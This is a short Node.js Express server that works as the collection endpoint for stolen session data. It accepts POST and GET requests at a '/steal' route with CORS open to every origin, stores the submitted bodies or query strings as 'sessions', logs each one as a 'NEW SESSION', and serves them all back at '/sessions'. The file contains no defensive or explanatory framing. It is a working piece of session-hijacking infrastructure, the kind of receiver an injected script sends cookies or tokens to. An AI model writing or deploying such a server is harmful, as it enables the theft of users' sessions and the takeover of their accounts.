const express = require('express');
const cors = require('cors');
const app = express();

app.use(cors());
app.use(express.json({ limit: '10mb' }));

const sessions = [];

app.post('/steal', (req, res) => {
    sessions.push({
        time: new Date().toISOString(),
        data: req.body
    });
    console.log('🔴 NEW SESSION:', req.body);
    res.send('OK');
});

app.get('/steal', (req, res) => {
    if (req.query.data) {
        sessions.push({
            time: new Date().toISOString(),
            data: req.query.data
        });
    }
    res.send('OK');
});

app.get('/sessions', (req, res) => {
    res.json(sessions);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log('🎯 Server running on port', PORT);
});
